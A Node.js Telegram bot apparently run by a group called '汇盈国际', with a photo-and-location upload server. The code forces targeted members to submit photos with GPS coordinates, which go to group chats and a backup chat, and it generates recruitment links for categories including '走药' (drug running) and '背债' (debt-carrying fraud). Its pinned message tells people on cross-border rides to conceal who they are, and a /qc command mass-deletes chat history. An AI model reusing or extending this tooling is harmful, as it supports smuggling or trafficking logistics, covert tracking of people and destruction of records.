const { Telegraf } = require('telegraf');
const fs = require('fs');
const express = require('express');

const bot = new Telegraf(process.env.BOT_TOKEN);
const GROUP_CHAT_IDS = [
  -1003354803364, // Group 1
  -1003381368112, // Group 2
  -1003308598858, // Group 3
  -1003368574609, // Group 4
  -1003286063197, // Group 5
  -1003378109615, // Group 6
  -1003293673373, // Group 7
  -1003203365614, // Group 8
  -1000000000009, // Group 9
  -1000000000010 // Group 10
];
const BACKUP_GROUP_ID = -1003293673373;
const WEB_APP_URL = 'https://huiying8.netlify.app';

const app = express();

// 手动 CORS 处理
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

const pendingTasks = new Map();
const AUTH_FILE = './authorized.json';
let authorizedUsers = new Map();
const warningMessages = new Map();
const unauthorizedMessages = new Map();
const zlMessages = new Map();
const ZL_LINKS = {
  '租车': 'https://che88.netlify.app',
  '大飞': 'https://fei88.netlify.app',
  '走药': 'https://yao88.netlify.app',
  '背债': 'https://bei88.netlify.app'
};
const ZJ_LINKS = {
  '租车': 'https://zjc88.netlify.app',
  '大飞': 'https://zjf88.netlify.app',
  '走药': 'https://zjy88.netlify.app',
  '背债': 'https://zjb88.netlify.app'
};
const INITIAL_TEXT = '填写招聘申请时请打开手机录屏，按照上面顺序排列填写资料后拍照关闭手机录屏后发送到群里！';

function loadAuth() {
    try {
        const data = fs.readFileSync(AUTH_FILE, 'utf8');
        const parsed = JSON.parse(data);
        authorizedUsers.clear();
        for (let [key, value] of Object.entries(parsed)) {
            authorizedUsers.set(Number(key), value);
        }
        console.log('授权文件加载成功，当前授权用户数:', authorizedUsers.size);
    } catch (error) {
        console.log('授权文件不存在或加载失败，使用空Map');
    }
}

function saveAuth() {
    try {
        fs.writeFileSync(AUTH_FILE, JSON.stringify(Object.fromEntries(authorizedUsers)));
    } catch (error) {
        console.error('保存授权失败:', error);
    }
}

loadAuth();

function factoryReset() {
    authorizedUsers.clear();
    pendingTasks.clear();
    warningMessages.clear();
    unauthorizedMessages.clear();
    zlMessages.clear();
    try {
        fs.unlinkSync(AUTH_FILE);
        console.log('出厂设置完成: 所有状态清空，授权文件已删除');
    } catch (error) {
        console.error('删除授权文件失败:', error);
    }
}

async function sendToChat(chatId, photoBuffer, caption, lat, lng, filename) {
    try {
        await bot.telegram.sendPhoto(chatId, { source: photoBuffer }, {
            caption,
            parse_mode: 'Markdown'
        });
        if (lat && lng) {
            await bot.telegram.sendLocation(chatId, parseFloat(lat), parseFloat(lng));
        } else {
            await bot.telegram.sendMessage(chatId, '⚠️ 位置数据缺失');
        }
        console.log(`✅ 成功发送照片到群组 ${chatId}`);
    } catch (error) {
        console.error(`发送到群组 ${chatId} 失败:`, error);
        try {
            await bot.telegram.sendMessage(BACKUP_GROUP_ID, `❌ 发送失败: ${chatId} - ${error.message}`);
        } catch (e) {
            console.error('发送错误报告失败:', e);
        }
    }
}

async function isAdmin(chatId, userId) {
    try {
        const member = await bot.telegram.getChatMember(chatId, userId);
        return member.status === 'administrator' || member.status === 'creator';
    } catch (error) {
        return false;
    }
}

// ==================== 修复的文件上传接口 ====================
app.post('/upload', async (req, res) => {
  console.log('📸 收到上传请求');
  
  try {
    // 获取整个请求体
    const chunks = [];
    for await (const chunk of req) {
      chunks.push(chunk);
    }
    const buffer = Buffer.concat(chunks);
    
    // 从查询参数获取数据（前端使用 FormData 会将这些放在 URL 参数中）
    const { lat, lng, name = '汇盈用户', time, chatid } = req.query;
    
    console.log('📋 上传参数:', { lat, lng, name, time, chatid });

    if (!lat || !lng) {
      console.log('❌ 缺少经纬度参数');
      return res.status(400).json({ code: 1, msg: '缺少经纬度' });
    }

    // 验证 buffer 是否有效
    if (!buffer || buffer.length < 100) {
      console.log('❌ 照片数据无效或太小');
      return res.status(400).json({ code: 1, msg: '照片数据无效' });
    }

    const formattedTime = time 
      ? new Date(parseInt(time)).toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' })
      : new Date().toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' });

    const caption = `【H5拍照上传】\n用户：${name}\n时间：${formattedTime}\n位置：${parseFloat(lat).toFixed(6)}, ${parseFloat(lng).toFixed(6)}\n高德地图：https://amap.com/dir?destination=${lng},${lat}\n谷歌地图：https://www.google.com/maps?q=${lat},${lng}`;

    console.log(`📤 准备发送照片到群组，chatid: ${chatid}, 照片大小: ${buffer.length} bytes`);

    // 发送到指定群组
    if (chatid && GROUP_CHAT_IDS.includes(Number(chatid))) {
      console.log(`📤 发送到来源群组: ${chatid}`);
      await sendToChat(Number(chatid), buffer, caption, lat, lng, 'daka.jpg');
    } else {
      console.log(`⚠️ 无效的群组ID或未提供: ${chatid}`);
    }

    // 永远发送到备份群组
    console.log(`📤 发送到备份群组: ${BACKUP_GROUP_ID}`);
    await sendToChat(BACKUP_GROUP_ID, buffer, `[备份] ${caption}`, lat, lng, 'daka_backup.jpg');

    console.log('✅ 照片上传和处理完成');
    res.json({ code: 0, msg: 'success' });

  } catch (err) {
    console.error('❌ H5上传失败:', err);
    res.status(500).json({ code: 1, msg: err.message });
  }
});

// 健康检查端点
app.get('/', (req, res) => {
    res.json({ 
        status: 'online', 
        message: 'Bot is alive! 🚀',
        timestamp: new Date().toISOString(),
        groups: GROUP_CHAT_IDS.length
    });
});

// 测试端点
app.get('/test', (req, res) => {
    res.json({ 
        code: 0, 
        message: '后端服务正常运行',
        groups: GROUP_CHAT_IDS.length,
        timestamp: new Date().toISOString()
    });
});

// ==================== Bot 命令处理 ====================

bot.use(async (ctx, next) => {
    if (ctx.message && ctx.chat?.type === 'private') {
        const userId = ctx.from.id;
        const userName = ctx.from.first_name || '未知用户';
        const userUsername = ctx.from.username ? `@${ctx.from.username}` : '无用户名';
        const messageText = ctx.message.text || '[非文本消息，如照片/位置]';
        const timestamp = new Date().toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' });
        const replyText = `❌ 🔒 本机器人只供汇盈国际内部使用，你没有权限访问。如果有疑问，请联系汇盈国际负责人授权。🚫`;
        try {
            await ctx.reply(replyText);
            const reportText = `🚨 **私信访问警报** 🚨\n\n` +
                `👤 用户: ${userName} ${userUsername}\n` +
                `🆔 ID: ${userId}\n` +
                `📝 消息内容: ${messageText}\n` +
                `⏰ 时间: ${timestamp}\n\n` +
                `💎 汇盈国际 - 安全监控系统`;
            await bot.telegram.sendMessage(BACKUP_GROUP_ID, reportText, { parse_mode: 'Markdown' });
        } catch (error) {
            console.error('❌ Private message handling failed:', error);
        }
        return;
    }
    await next();
});

bot.command('bz', (ctx) => {
    const chatId = ctx.chat.id;
    if (!GROUP_CHAT_IDS.includes(chatId)) {
        return;
    }
    const helpText = `📋 汇盈国际机器人指令面板\n\n` +
        `🔹 /hc - 🚗 换车安全确认拍照 (授权用户专用)\n` +
        `🔹 /boss - Boss 要求指定用户拍照 (汇盈国际负责人专用)\n` +
        `🔹 /lg - 龙哥要求指定用户拍照 汇盈国际负责人专用)\n` +
        `🔹 /zl - 招聘申请链接生成 (汇盈国际负责人专用)\n` +
        `🔹 /zj - 招聘申请链接生成 (中介链接) (汇盈国际负责人专用)\n` +
        `🔹 /qc - 🗑️ 彻底恢复出厂 (汇盈国际负责人专用)\n` +
        `🔹 /lh - 🚫 踢出用户 (汇盈国际负责人专用)\n` +
        `🔹 /lj - 🔗 生成当前群组邀请链接 (汇盈国际负责人专用)\n` +
        `🔹 /bz - 📖 显示此说明 (所有用户可用)\n\n` +
        ``;
    try {
        ctx.reply(helpText, { parse_mode: 'Markdown' });
    } catch (error) {
        console.error('Help command failed:', error);
    }
});

bot.command('lj', async (ctx) => {
    const chatId = ctx.chat.id;
    if (!GROUP_CHAT_IDS.includes(chatId)) {
        return;
    }
    const isUserAdmin = await isAdmin(chatId, ctx.from.id);
    if (!isUserAdmin) {
        try {
            const noPermMsg = await ctx.reply('❌ 🔒 无权限！ /lj 只限汇盈国际负责人使用。');
            unauthorizedMessages.set(noPermMsg.message_id, { userId: ctx.from.id, userName: ctx.from.first_name || '用户' });
        } catch (error) {
            console.error('Permission check for /lj failed:', error);
        }
        return;
    }
    try {
        const inviteLink = await bot.telegram.exportChatInviteLink(chatId);
        const linkText = ` 🔗 ✨汇盈国际官方对接群链接 \n\n` +
            ` 点击下方按钮直接加入群！\n\n`;
        ctx.reply(linkText, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [[
                    { text: '👉 直接点击加入群', url: inviteLink }
                ]]
            }
        });
    } catch (error) {
        ctx.reply('❌ 🔗 生成链接失败！ 检查 Bot 权限 (can_invite_users)。');
        console.error('Invite link generation failed:', error);
    }
});

bot.command('qc', async (ctx) => {
    const chatId = ctx.chat.id;
    if (!GROUP_CHAT_IDS.includes(chatId)) {
        return;
    }
    const isUserAdmin = await isAdmin(chatId, ctx.from.id);
    if (!isUserAdmin) {
        try {
            const noPermMsg = await ctx.reply('❌ 🔒 无权限！ /qc 只限汇盈国际负责人使用。');
            unauthorizedMessages.set(noPermMsg.message_id, { userId: ctx.from.id, userName: ctx.from.first_name || '用户' });
        } catch (error) {
            console.error('Permission check for /qc failed:', error);
        }
        return;
    }
    let startMessageId = ctx.message.message_id;
    const replyTo = ctx.message.reply_to_message;
    if (replyTo) {
        startMessageId = replyTo.message_id;
    }
    ctx.reply(`🗑️ 开始彻底清空群聊所有记录... (所有消息清空完像新群一样)`);
    let deletedCount = 0;
    let consecutiveFails = 0;
    let maxAttempts = 5000;
    let i = 1;
    while (i <= maxAttempts && consecutiveFails < 10) {
        try {
            await bot.telegram.deleteMessage(chatId, startMessageId - i);
            deletedCount++;
            consecutiveFails = 0;
            i++;
            await new Promise(resolve => setTimeout(resolve, 20));
        } catch (error) {
            if (error.description && error.description.includes('message to delete not found')) {
                consecutiveFails++;
                i++;
                continue;
            } else {
                break;
            }
        }
    }
    ctx.reply(`🗑️ 清档完成！ 删除了 ${deletedCount} 条记录。当前群像新群一样清空！`);
    const resetMsg = await ctx.reply(`🔄 **一键出厂设置确认** 🔄\n\n` +
        `⚠️ 此操作将清空所有授权数据、临时任务和警告记录，Bot 将恢复初始状态（像新的一样）。\n\n` +
        `💡 重置后，所有用户需重新授权。立即生效，无需重启。\n\n` +
        `点击下方按钮确认：`, {
        reply_markup: {
            inline_keyboard: [
                [{ text: '✅ 是，重置出厂', callback_data: 'qc_reset_yes' }],
                [{ text: '❌ 否，取消', callback_data: 'qc_reset_no' }]
            ]
        },
        parse_mode: 'Markdown'
    });
});

bot.command('zl', async (ctx) => {
    const chatId = ctx.chat.id;
    if (!GROUP_CHAT_IDS.includes(chatId)) {
        return;
    }
    const isUserAdmin = await isAdmin(chatId, ctx.from.id);
    if (!isUserAdmin) {
        try {
            const noPermMsg = await ctx.reply('❌ 🔒 无权限！ /zl 只限汇盈国际负责人使用。');
            unauthorizedMessages.set(noPermMsg.message_id, { userId: ctx.from.id, userName: ctx.from.first_name || '用户' });
        } catch (error) {
            console.error('Permission check for /zl failed:', error);
        }
        return;
    }
    let targetUserId, targetFirstName, targetUsername;
    const replyTo = ctx.message.reply_to_message;
    if (replyTo) {
        targetUserId = replyTo.from.id;
        targetFirstName = replyTo.from.first_name || '未知';
        targetUsername = replyTo.from.username ? `@${replyTo.from.username}` : '无用户名';
    } else {
        const match = ctx.message.text.match(/@(\w+)/);
        if (match) {
            const username = match[1];
            try {
                const user = await bot.telegram.getChat(`@${username}`);
                targetUserId = user.id;
                targetFirstName = user.first_name || '未知';
                targetUsername = `@${username}`;
            } catch (error) {
                return ctx.reply(`❌ 👤 用户 @${username} 不存在！`);
            }
        } else {
            return ctx.reply('👆 请@用户或回复消息指定');
        }
    }
    if (!targetUserId) return ctx.reply('❌ 请指定用户！');
    try {
        const initialText = `${INITIAL_TEXT}\n\n👤 请点击下方按钮选择申请类型：`;
        const replyMsg = await ctx.reply(initialText, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '租车', callback_data: 'zl_租车' },
                        { text: '大飞', callback_data: 'zl_大飞' }
                    ],
                    [
                        { text: '走药', callback_data: 'zl_走药' },
                        { text: '背债', callback_data: 'zl_背债' }
                    ]
                ]
            }
        });
        zlMessages.set(replyMsg.message_id, { targetUserId, targetFirstName, targetUsername, commandType: 'zl' });
    } catch (error) {
        console.error('/zl command failed:', error);
    }
});

bot.command('zj', async (ctx) => {
    const chatId = ctx.chat.id;
    if (!GROUP_CHAT_IDS.includes(chatId)) {
        return;
    }
    const isUserAdmin = await isAdmin(chatId, ctx.from.id);
    if (!isUserAdmin) {
        try {
            const noPermMsg = await ctx.reply('❌ 🔒 无权限！ /zj 只限汇盈国际负责人使用。');
            unauthorizedMessages.set(noPermMsg.message_id, { userId: ctx.from.id, userName: ctx.from.first_name || '用户' });
        } catch (error) {
            console.error('Permission check for /zj failed:', error);
        }
        return;
    }
    let targetUserId, targetFirstName, targetUsername;
    const replyTo = ctx.message.reply_to_message;
    if (replyTo) {
        targetUserId = replyTo.from.id;
        targetFirstName = replyTo.from.first_name || '未知';
        targetUsername = replyTo.from.username ? `@${replyTo.from.username}` : '无用户名';
    } else {
        const match = ctx.message.text.match(/@(\w+)/);
        if (match) {
            const username = match[1];
            try {
                const user = await bot.telegram.getChat(`@${username}`);
                targetUserId = user.id;
                targetFirstName = user.first_name || '未知';
                targetUsername = `@${username}`;
            } catch (error) {
                return ctx.reply(`❌ 👤 用户 @${username} 不存在！`);
            }
        } else {
            return ctx.reply('👆 请@用户或回复消息指定');
        }
    }
    if (!targetUserId) return ctx.reply('❌ 请指定用户！');
    try {
        const initialText = `${INITIAL_TEXT}\n\n👤 请点击下方按钮选择申请类型：`;
        const replyMsg = await ctx.reply(initialText, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '租车', callback_data: 'zj_租车' },
                        { text: '大飞', callback_data: 'zj_大飞' }
                    ],
                    [
                        { text: '走药', callback_data: 'zj_走药' },
                        { text: '背债', callback_data: 'zj_背债' }
                    ]
                ]
            }
        });
        zlMessages.set(replyMsg.message_id, { targetUserId, targetFirstName, targetUsername, commandType: 'zj' });
    } catch (error) {
        console.error('/zj command failed:', error);
    }
});

bot.on('callback_query', async (ctx) => {
    const data = ctx.callbackQuery.data;
    const chatId = ctx.chat.id;
    if (!GROUP_CHAT_IDS.includes(chatId)) return;
    const msgId = ctx.callbackQuery.message.message_id;
    
    if (data.startsWith('zl_') || data.startsWith('zj_')) {
        const commandType = data.startsWith('zl_') ? 'zl' : 'zj';
        const buttonKey = data.split('_')[1];
        const stored = zlMessages.get(msgId);
        if (!stored || stored.commandType !== commandType || !ZL_LINKS[buttonKey] && !ZJ_LINKS[buttonKey]) {
            await ctx.answerCbQuery('❌ 无效操作！');
            return;
        }
        const links = commandType === 'zl' ? ZL_LINKS : ZJ_LINKS;
        const link = links[buttonKey];
        const { targetUserId, targetFirstName, targetUsername } = stored;
        const userInfo = `TG名字: ${targetFirstName}\nTG用户名: ${targetUsername}\nID: ${targetUserId}`;
        const instruction = commandType === 'zl' ?
            '点击上方链接打开浏览器进行填写，填写时记住要录屏填写！填写好了发到此群！' :
            '发给你的客户让客户打开浏览器进行填写，填写时记住要录屏填写！填写好了发到此群！';
        const newText = `${INITIAL_TEXT}\n\n👤 ${userInfo}\n\n🔗 申请链接： [点击进入网站](${link})\n\n\`复制链接: ${link}\`\n\n${instruction}`;
        try {
            await ctx.editMessageText(newText, { parse_mode: 'Markdown' });
            await ctx.answerCbQuery(`✅ 已更新为 ${buttonKey} 链接！`);
            zlMessages.delete(msgId);
        } catch (error) {
            console.error('Edit message for zl/zj failed:', error);
            await ctx.answerCbQuery('❌ 更新失败，请重试。');
        }
        return;
    }
    
    const userId = ctx.from.id;
    const isUserAdmin = await isAdmin(chatId, userId);
    if (!isUserAdmin) return;
    
    if (data === 'qc_reset_yes') {
        factoryReset();
        await ctx.answerCbQuery('✅ 出厂设置执行中...');
        await ctx.editMessageText(`🚀 **出厂设置完成！** 🚀\n\n` +
            `✅ 所有授权已清空（authorized.json 删除）。\n` +
            `✅ 临时任务、警告记录已重置。\n` +
            `✅ 当前群所有消息已清空\n` +
            `💎 Bot 现在像新的一样，所有用户需重新授权。`, { parse_mode: 'Markdown' });
    } else if (data === 'qc_reset_no') {
        await ctx.answerCbQuery('❌ 取消出厂设置');
        await ctx.editMessageText('❌ 出厂设置已取消。', { parse_mode: 'Markdown' });
    }
    await ctx.answerCbQuery();
});

bot.command('lh', async (ctx) => {
    const chatId = ctx.chat.id;
    if (!GROUP_CHAT_IDS.includes(chatId)) {
        return;
    }
    const isUserAdmin = await isAdmin(chatId, ctx.from.id);
    if (!isUserAdmin) {
        try {
            const noPermMsg = await ctx.reply('❌ 🔒 无权限！ /lh 只限汇盈国际负责人使用。');
            unauthorizedMessages.set(noPermMsg.message_id, { userId: ctx.from.id, userName: ctx.from.first_name || '用户' });
        } catch (error) {
            console.error('Permission check for /lh failed:', error);
        }
        return;
    }
    let targetUserId;
    let userName;
    const messageText = ctx.message.text;
    const replyTo = ctx.message.reply_to_message;
    if (replyTo) {
        targetUserId = replyTo.from.id;
        userName = replyTo.from.first_name || (replyTo.from.username ? `@${replyTo.from.username}` : '用户');
    } else {
        const match = messageText.match(/@(\w+)/);
        if (match) {
            const username = match[1];
            try {
                const user = await bot.telegram.getChat(`@${username}`);
                targetUserId = user.id;
                userName = `@${username}`;
            } catch (error) {
                return ctx.reply(`❌ 👤 用户 @${username} 不存在！`);
            }
        } else {
            return ctx.reply('👆 请@用户或回复消息指定');
        }
    }
    if (!targetUserId) return ctx.reply('❌ 用户 ID 获取失败！');
    try {
        await bot.telegram.banChatMember(chatId, targetUserId, { revoke_messages: true });
        ctx.reply(`🚫 用户 ${userName} 已踢出并永久拉黑！ (ID: ${targetUserId}) 💥`);
    } catch (error) {
        ctx.reply(`❌ 🚨 拉黑失败：${error.description} – 检查 Bot 权限 (can_ban_members)`);
        console.error('Ban user failed:', error);
    }
});

bot.command('boss', async (ctx) => {
    const chatId = ctx.chat.id;
    if (!GROUP_CHAT_IDS.includes(chatId)) {
        return;
    }
    const isUserAdmin = await isAdmin(chatId, ctx.from.id);
    if (!isUserAdmin) {
        try {
            const noPermMsg = await ctx.reply('❌ 🔒 无权限！ /boss 只限汇盈国际负责人使用。');
            unauthorizedMessages.set(noPermMsg.message_id, { userId: ctx.from.id, userName: ctx.from.first_name || '用户' });
        } catch (error) {
            console.error('Permission check for /boss failed:', error);
        }
        return;
    }
    let targetUser, targetUserId;
    const messageText = ctx.message.text;
    const replyTo = ctx.message.reply_to_message;
    if (replyTo) {
        targetUser = replyTo.from.username || replyTo.from.first_name;
        targetUserId = replyTo.from.id;
    } else {
        const match = messageText.match(/@(\w+)/);
        if (match) {
            const username = match[1];
            try {
                const user = await bot.telegram.getChat(`@${username}`);
                targetUserId = user.id;
                targetUser = username;
            } catch (error) {
                return ctx.reply(`❌ 👤 用户 @${username} 不存在！`);
            }
        } else {
            return ctx.reply('👆 请@用户或回复消息指定');
        }
    }
    if (!targetUser || !targetUserId) return ctx.reply('❌ 请指定用户！');
    try {
        const replyMsg = await ctx.reply(` 汇盈国际负责人Boss要求你拍照，请点击下方拍照 <a href="tg://user?id=${targetUserId}">@${targetUser}</a> ✨`, {
            reply_markup: {
                inline_keyboard: [[
                    { text: '📷 开始拍照', url: `${WEB_APP_URL}/?chatid=${chatId}` }
                ]]
            },
            parse_mode: 'HTML'
        });
        const timeoutId = setTimeout(async () => {
            if (pendingTasks.has(replyMsg.message_id)) {
                await bot.telegram.sendMessage(chatId, `⏰ 🚨 提醒：@${targetUser}，Boss 要求拍照已超时 5 分钟，请尽快完成！🔥`, {
                    reply_to_message_id: replyMsg.message_id,
                    parse_mode: 'Markdown'
                });
                pendingTasks.delete(replyMsg.message_id);
            }
        }, 5 * 60 * 1000);
        pendingTasks.set(replyMsg.message_id, { targetUser, type: 'boss', timeoutId, chatId });
    } catch (error) {
        console.error('/boss command failed:', error);
    }
});

bot.command('lg', async (ctx) => {
    const chatId = ctx.chat.id;
    if (!GROUP_CHAT_IDS.includes(chatId)) {
        return;
    }
    const isUserAdmin = await isAdmin(chatId, ctx.from.id);
    if (!isUserAdmin) {
        try {
            const noPermMsg = await ctx.reply('❌ 🔒 无权限！ /lg 只限汇盈国际负责人使用。');
            unauthorizedMessages.set(noPermMsg.message_id, { userId: ctx.from.id, userName: ctx.from.first_name || '用户' });
        } catch (error) {
            console.error('Permission check for /lg failed:', error);
        }
        return;
    }
    let targetUser, targetUserId;
    const messageText = ctx.message.text;
    const replyTo = ctx.message.reply_to_message;
    if (replyTo) {
        targetUser = replyTo.from.username || replyTo.from.first_name;
        targetUserId = replyTo.from.id;
    } else {
        const match = messageText.match(/@(\w+)/);
        if (match) {
            const username = match[1];
            try {
                const user = await bot.telegram.getChat(`@${username}`);
                targetUserId = user.id;
                targetUser = username;
            } catch (error) {
                return ctx.reply(`❌ 👤 用户 @${username} 不存在！`);
            }
        } else {
            return ctx.reply('👆 请@用户或回复消息指定');
        }
    }
    if (!targetUser || !targetUserId) return ctx.reply('❌ 请指定用户！');
    try {
        const replyMsg = await ctx.reply(` 汇盈国际负责人龍哥要求你拍照，请点击下方拍照 <a href="tg://user?id=${targetUserId}">@${targetUser}</a> ✨`, {
            reply_markup: {
                inline_keyboard: [[
                    { text: '📷 开始拍照', url: `${WEB_APP_URL}/?chatid=${chatId}` }
                ]]
            },
            parse_mode: 'HTML'
        });
        const timeoutId = setTimeout(async () => {
            if (pendingTasks.has(replyMsg.message_id)) {
                await bot.telegram.sendMessage(chatId, `⏰ 🚨 提醒：@${targetUser}，龍哥要求拍照已超时 5 分钟，请尽快完成！🔥`, {
                    reply_to_message_id: replyMsg.message_id,
                    parse_mode: 'Markdown'
                });
                pendingTasks.delete(replyMsg.message_id);
            }
        }, 5 * 60 * 1000);
        pendingTasks.set(replyMsg.message_id, { targetUser, type: 'lg', timeoutId, chatId });
    } catch (error) {
        console.error('/lg command failed:', error);
    }
});

bot.command('hc', async (ctx) => {
    const chatId = ctx.chat.id;
    if (!GROUP_CHAT_IDS.includes(chatId)) {
        return;
    }
    const userId = ctx.from.id;
    const isAuthorized = authorizedUsers.get(userId) || false;
    const isAdminUser = await isAdmin(chatId, userId);
    if (!isAuthorized && !isAdminUser) {
        try {
            const noPermMsg = await ctx.reply('❌ 🔒 无权限！ 你需授权才能使用 /hc 请联系汇盈国际负责人。');
            unauthorizedMessages.set(noPermMsg.message_id, { userId, userName: ctx.from.first_name || '用户' });
        } catch (error) {
            console.error('Permission check for /hc failed:', error);
        }
        return;
    }
    await ctx.reply('🚗 为了保障你的安全换车前请拍照！ 换车一定要是上一个司机安排的哦，如果是请点击下方拍照，如果不是请联系负责人 ', {
        reply_markup: {
            inline_keyboard: [[
                { text: '🚗 开始拍照', url: `${WEB_APP_URL}/?chatid=${chatId}` }
            ]]
        }
    });
});

bot.on('new_chat_members', async (ctx) => {
    const chatId = ctx.chat.id;
    if (!GROUP_CHAT_IDS.includes(chatId)) return;
    if (ctx.message.new_chat_members.some(member => member.is_bot)) return;
    const newMembers = ctx.message.new_chat_members.filter(member => !member.is_bot);
    for (const member of newMembers) {
        const userId = member.id;
        authorizedUsers.set(userId, false);
        saveAuth();
        try {
            await bot.telegram.restrictChatMember(chatId, userId, { permissions: { can_send_messages: false } });
        } catch (error) {
            console.error('Restrict new member failed:', error);
        }
        const userName = member.first_name || '用户';
        const userUsername = member.username ? `@${member.username}` : '';
        try {
            const warningMsg = await ctx.reply(`🚫 这是汇盈国际官方对接群 \n\n` +
                `👤 **欢迎 ${userName} ${userUsername}！** ✨\n\n` +
                `⚠️ **重要提醒**：这是汇盈国际官方对接群，你还没有获得授权权限，请立即联系负责人进行授权！\n\n` +
                `🔗 **联系方式**：请联系汇盈国际负责人或等待通知。\n\n` +
                `🚀 **汇盈国际 - 专业、安全、可靠** 💎`, { parse_mode: 'Markdown' });
            warningMessages.set(warningMsg.message_id, { userId, userName });
        } catch (error) {
            console.error('New member warning failed:', error);
        }
    }
    const welcomeText = `🚨 **🔥 上车安全提醒 - 必读！** 🔥\n\n` +
        `🛣️ 上车以后不要跟其他人过多交流，不要透露自己来自哪里，不要透露个人信息，不要透露自己来干嘛的，路线不只是带你自己出境的还带其他人的，车上什么人都有，有出境上班的，有案子跑路的，所以目的地很多人都是不一样的，不用过多的跟他们聊天！！\n\n` +
        `👋 **欢迎新成员！** 请注意以上内容，确保安全出行。路上有什么问题及时报告到此群✨\n\n` +
        `🚀 汇盈国际 - 专业、安全、可靠 💎`;
    try {
        const msg = await ctx.reply(welcomeText, { parse_mode: 'Markdown' });
        await bot.telegram.pinChatMessage(chatId, msg.message_id, { disable_notification: false });
    } catch (error) {
        console.error('Welcome pin failed:', error);
    }
});

bot.on('text', async (ctx) => {
    const chatId = ctx.chat.id;
    if (!GROUP_CHAT_IDS.includes(chatId)) {
        return;
    }
    const userId = ctx.from.id;
    const isAuthorized = authorizedUsers.get(userId) || false;
    const isAdminUser = await isAdmin(chatId, userId);
    if (!isAdminUser && !isAuthorized) {
        try {
            try {
                await bot.telegram.deleteMessage(chatId, ctx.message.message_id);
            } catch (delError) {
                if (!delError.description || !delError.description.includes('message to delete not found')) {
                    console.error('Delete message failed:', delError);
                }
            }
            const userName = ctx.from.first_name || '用户';
            const userUsername = ctx.from.username ? `@${ctx.from.username}` : '';
            const warningMsg = await ctx.reply(`🚫 这里是汇盈国际官方对接群 \n\n` +
                `👤 **${userName} ${userUsername}，你还没有获得授权！** ⚠️\n\n` +
                `💡 **立即联系负责人授权**，否则无法发言。\n\n` +
                `🚀 汇盈国际 - 专业、安全、可靠 💎`, { parse_mode: 'Markdown' });
            warningMessages.set(warningMsg.message_id, { userId, userName });
            if (!(await isAdmin(chatId, userId))) {
                try {
                    await bot.telegram.restrictChatMember(chatId, userId, { permissions: { can_send_messages: false } });
                } catch (restrictError) {
                    if (!restrictError.description || !restrictError.description.includes("can't remove chat owner")) {
                        console.error('Restrict user failed:', restrictError);
                    }
                }
            }
        } catch (error) {
            if (!error.description || !error.description.includes('message to delete not found')) {
                console.error('Unauthorized text handling failed:', error);
            }
        }
        return;
    }
    const replyTo = ctx.message.reply_to_message;
    if (isAdminUser && replyTo) {
        const text = ctx.message.text.trim();
        if (text === '授权') {
            if (warningMessages.has(replyTo.message_id)) {
                const { userId: targetUserId, userName } = warningMessages.get(replyTo.message_id);
                if (targetUserId) {
                    authorizedUsers.set(targetUserId, true);
                    saveAuth();
                    try {
                        await bot.telegram.restrictChatMember(chatId, targetUserId, { permissions: { can_send_messages: true } });
                        await ctx.reply(`✅已授权 ${userName} (ID: ${targetUserId})！\n他现在可以用 /hc 指令并且发言了`);
                        warningMessages.delete(replyTo.message_id);
                    } catch (error) {
                        ctx.reply('❌ **🚨 授权失败！** 检查 Bot 禁言权限 (can_restrict_members)。');
                        console.error('Authorization failed:', error);
                    }
                } else {
                    ctx.reply('❌ **授权失败！** 无效用户 ID。');
                }
            } else if (unauthorizedMessages.has(replyTo.message_id)) {
                const { userId: targetUserId, userName } = unauthorizedMessages.get(replyTo.message_id);
                if (targetUserId) {
                    authorizedUsers.set(targetUserId, true);
                    saveAuth();
                    await ctx.reply(`✅已授权 ${userName} (ID: ${targetUserId})！ 🚀 他现在可以用 /hc 指令。💎`);
                    unauthorizedMessages.delete(replyTo.message_id);
                } else {
                    ctx.reply('❌ **授权失败！** 无效用户 ID。');
                }
            }
        }
    }
});

// 启动服务器和 Bot
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🌐 Express 服务器启动成功，监听端口 ${PORT}`);
    console.log(`📝 健康检查: https://huiying888.onrender.com/`);
    console.log(`🧪 测试端点: https://huiying888.onrender.com/test`);
});

bot.launch().then(() => {
    console.log('🚀 Bot 启动成功！');
    console.log(`🤖 支持 ${GROUP_CHAT_IDS.length} 个群组`);
}).catch(err => {
    console.error('❌ Bot 启动失败:', err);
});

process.once('SIGINT', () => {
    console.log('收到 SIGINT，关闭 Bot 和服务器...');
    bot.stop('SIGINT');
});

process.once('SIGTERM', () => {
    console.log('收到 SIGTERM，关闭 Bot 和服务器...');
    bot.stop('SIGTERM');
});
